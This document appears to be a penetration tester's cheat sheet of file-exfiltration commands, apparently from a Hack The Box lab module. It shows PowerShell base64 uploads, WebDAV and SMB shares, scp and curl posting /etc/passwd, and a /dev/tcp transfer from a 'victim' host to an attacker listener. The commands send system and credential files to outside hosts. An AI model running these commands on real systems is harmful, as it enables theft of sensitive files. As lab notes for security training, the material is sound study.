
### Powershell commands

start listener
```
python3 -m uploadserver 8000
```

1. base64 upload `
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
catch payload
```shell
nc -lvnp 8000

echo <base64-string> | base64 -d -w 0 > hosts
```

 2.  invoke-fileupload.ps1 script
```
 https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\<loc>
```

##  SMB Uploads

```shell-session
sudo pip3 install wsgidav cheroot
```

```shell-session
 sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
verify connection
```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot
```

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

# scp upload
```
scp victim@192.168.1.10:/etc/passwd ~/
```
## linux curl

generate cert and start server
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
 python3 -m uploadserver 443 --server-certificate ~/server.pem    
```

`Upload Multiple Files`
```shell-session
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@<path2> --insecure
```

PHP
```shell-session
$ php -S 0.0.0.0:8000
```
ruby:
```shell-session
ruby -run -ehttpd . -p8000
```


`File Upload using SCP`
```shell-session
$ scp /etc/passwd vipa0z@10.129.86.90:/home/vipa0z/

```

## dev/tcp 
`verify file integrity`
```
victim@NIX02:~$ md5sum shell
4a0a25b6802153957c31dc5a70877913
```
`victim`
```
victim@NIX02:~$ cat shell-v > /dev/tcp/10.10.16.44/4444
```

`attacker`
```
┌──(demise㉿kali)-[~]
└─$ sudo nc -nlvp 4444 > shell

┌──(demise㉿kali)-[~]
└─$ md5sum shell
4a0a25b6802153957c31dc5a70877913  
```


